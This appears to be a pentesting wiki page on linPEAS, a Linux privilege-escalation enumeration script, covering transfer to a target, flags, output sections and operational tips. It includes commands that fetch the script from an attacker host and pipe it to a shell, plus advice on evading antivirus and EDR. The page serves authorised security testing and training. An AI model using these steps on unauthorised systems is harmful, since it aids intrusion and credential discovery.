---
tags: [tool]
module: linux_privilege_escalation
last_updated: 2026-05-10
source_count: 2
---

# linpeas.sh

Automated Linux privilege escalation enumeration script that finds hundreds of potential escalation vectors across a system in minutes.

## Overview

linPEAS (Linux Privilege Escalation Awesome Script) is the most widely used automated privilege escalation enumeration tool for Linux. It is part of the PEASS-ng (Privilege Escalation Awesome Scripts Suite) project. linPEAS enumerates the system comprehensively — OS/kernel details, users and groups, sudo rights, SUID/SGID binaries, capabilities, cron jobs, network configuration, interesting files, credentials, and much more.

Running linPEAS immediately after gaining a shell gives a high-signal-to-noise overview of the entire target environment. It does not exploit anything on its own — it surfaces information for the operator to assess and act on.

## Install / Transfer

linPEAS does not require installation. Transfer the script to the target in any convenient way:

```bash
# From attacker host — serve via HTTP
python3 -m http.server 8000

# On target — download and run directly (no disk write)
curl http://<attacker>:8000/linpeas.sh | sh

# Or download then execute
wget http://<attacker>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Alternatively, run without writing to disk:

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## Usage

```bash
# Standard run — full enumeration
./linpeas.sh

# Save output to file for offline review
./linpeas.sh -a 2>&1 | tee linpeas_output.txt

# Run specific sections (faster in time-constrained engagements)
./linpeas.sh -s   # stealth mode (less noise)

# Run only specific checks (e.g., software info)
./linpeas.sh -o softinfo

# Pipe output through less for paging with color
./linpeas.sh | less -R
```

## Key Output Sections

linPEAS uses color coding to indicate confidence/severity:

| Color | Meaning |
|---|---|
| Red/Yellow | High-confidence privilege escalation vector |
| Yellow | Interesting — worth investigating |
| Blue/Green | General information |

**Sections to prioritize:**

1. **System Information** — OS, kernel, sudo version
2. **Users & Groups** — sudo group members, users with login shells
3. **Sudo & SUID** — `sudo -l` output, SUID binary list
4. **Capabilities** — binaries with dangerous capabilities
5. **Cron Jobs** — all cron paths and scripts
6. **Interesting Files** — world-writable files, `.ssh` keys, config files with credentials
7. **Network** — interfaces, open ports, routing

## Flags & Options

| Flag | Description |
|---|---|
| `-a` | All checks (more thorough, slower) |
| `-s` | Stealth mode — avoid writing to disk |
| `-o <section>` | Run only a specific section |
| `-q` | Quiet — suppress non-essential messages |
| `-d <path>` | Upload results to a directory |
| `2>&1` | Capture stderr as well as stdout |

## Typical Use Cases

```bash
# Quick full scan (standard engagement use)
./linpeas.sh 2>&1 | tee /tmp/linpeas.out

# Review high-severity findings immediately (lines with [+])
./linpeas.sh 2>/dev/null | grep -A3 "\[+\]"

# Focus on sudo/SUID/capabilities only
./linpeas.sh -o sudosuid,capabilities

# Run in background, review when done
nohup ./linpeas.sh > /tmp/linpeas.out 2>&1 &
```

## Gotchas & Notes

- linPEAS is verbose — save output to a file and review systematically rather than watching it scroll
- Color output requires a terminal that supports ANSI codes; when piping to a file use `cat linpeas.out` in a color-aware terminal, or add `--color` to `cat`/`less`
- Antivirus/EDR solutions may flag linPEAS; in sensitive engagements, prefer manual enumeration or use obfuscated variants
- linPEAS does not exploit — it only enumerates; all findings require manual validation
- The script checks for the GTFOBins API online (requires internet); air-gapped targets will skip this check
- On very busy systems, the process spawning from linPEAS may be noticeable in logs; use pspy to check for process monitoring before running

## Installation

linpeas is not installed system-wide — it is downloaded per-engagement and uploaded to the target.

```bash
# Check if downloaded to the local staging area
ls /opt/PEASS-ng/linPEAS/linpeas.sh 2>/dev/null || echo "not staged"

# Download / update — fetches the latest release from GitHub
sudo mkdir -p /opt/PEASS-ng/linPEAS
sudo curl -L \
  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \
  -o /opt/PEASS-ng/linPEAS/linpeas.sh
sudo chmod +x /opt/PEASS-ng/linPEAS/linpeas.sh

# Verify
ls -lh /opt/PEASS-ng/linPEAS/linpeas.sh
```

> **Note:** linpeas is run ON THE TARGET, not the attacker. Transfer it via curl, wget, scp, or python HTTP server. It does not need to be installed on Kali itself.

## Related Pages

- [[attack/linux_privilege_escalation]]
- [[attack/linux_privesc_enumeration]]
- [[tools/enumeration/pspy]]

## Sources

- raw/linux_privilege_escalation/information_gathering_environment_enumeration.md
- raw/linux_privilege_escalation/information_gathering_linux_services_and_internals_enumeration.md
